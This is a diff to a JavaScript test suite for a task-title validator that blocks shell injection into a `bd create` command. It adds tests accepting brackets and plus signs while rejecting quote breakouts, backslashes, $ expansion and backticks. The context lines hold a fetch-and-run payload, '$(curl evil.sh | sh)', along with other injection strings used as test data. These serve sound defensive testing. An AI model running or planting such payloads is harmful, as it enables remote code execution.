@@ -67,6 +67,35 @@ describe('validateNewTask', () => {
         assert.strictEqual(result.description, 'Do the thing $(curl evil.sh | sh) after this.');
     });
 
+    // apra-fleet-v75: the allowlist excluded [ ] and +, which is this project's own
+    // bead-title convention ([bug]/[epic]/[test] prefixes). A real reviewer follow-up
+    // was rejected mid-sprint on the title below, while the planner created a
+    // bracketed title through bd directly in the same run -- one door rejecting what
+    // the other accepts. All three characters are inert inside the double quotes of
+    // `bd create "${title}"` in both POSIX shells and PowerShell.
+    test('accepts the project bracket convention and + in a title', () => {
+        for (const title of [
+            '[test] transit query + GET /transits route tests (filters, ordering, open transit)',
+            '[bug] kb_capture reports success but writes nothing',
+            'Support a + b in titles',
+        ]) {
+            const result = validateNewTask({ title, description: 'Safe description.', priority: 'P2' });
+            assert.strictEqual(result.ok, true, `expected ${JSON.stringify(title)} to be accepted: ${result.reason}`);
+        }
+    });
+
+    test('still rejects the shell-live characters that survive double quoting', () => {
+        for (const title of [
+            'Break out" here',        // closes the quote
+            'Trailing backslash \\',  // escapes the closing quote
+            'Expand $HOME now',       // parameter expansion
+            'Run `whoami` please',    // command substitution
+        ]) {
+            const result = validateNewTask({ title, description: 'Safe description.', priority: 'P2' });
+            assert.strictEqual(result.ok, false, `expected ${JSON.stringify(title)} to stay rejected`);
+        }
+    });
+
     test('rejects backticks in title', () => {
         const result = validateNewTask({
             title: 'Run `whoami` and report',
